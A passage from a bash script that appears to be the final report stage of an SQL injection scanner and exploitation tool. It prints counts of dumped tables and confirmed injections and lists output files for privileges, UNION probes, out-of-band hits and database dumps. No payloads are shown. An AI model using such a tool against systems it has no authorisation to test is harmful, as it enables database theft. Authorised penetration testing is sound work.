log "  ${R}Tables dumped :${NC} ${total_dumped}"
log "  ${R}TOTAL HITS    :${NC} ${total_hits}"
sep

if (( total_hits > 0 )); then
  log "${R}${BOLD}  ⚠  ${total_hits} finding(s) confirmed!${NC}"
  [[ -s "$HITS_FILE" ]] && grep -E "CONFIRMED|DUMPED|INFO|injectable|PRIV|DBA" "$HITS_FILE" 2>/dev/null | \
    while IFS= read -r l; do log "  ${R}→${NC} ${l}"; done
else
  log "${G}  ✓  No SQLi vulnerabilities confirmed${NC}"
fi
sep

log "\n${C}${BOLD}Output files:${NC}"
log "  ${G}Full log    :${NC} ${LOG_DIR}/full_log.txt"
log "  ${G}Confirmed   :${NC} ${LOG_DIR}/confirmed.txt"
log "  ${G}Intel       :${NC} ${LOG_DIR}/intel.txt"
log "  ${G}Privileges  :${NC} ${LOG_DIR}/privileges.txt"
log "  ${G}UNION probes:${NC} ${LOG_DIR}/union_probes.txt"
[[ "$OOB_ENABLED" == "true" ]] && log "  ${G}OOB hits    :${NC} ${LOG_DIR}/oob_hits.txt"
[[ -d "$DUMP_DIR" ]] && ls "$DUMP_DIR" 2>/dev/null | grep -q '.' && log "  ${G}Dumps       :${NC} ${DUMP_DIR}/"
sep
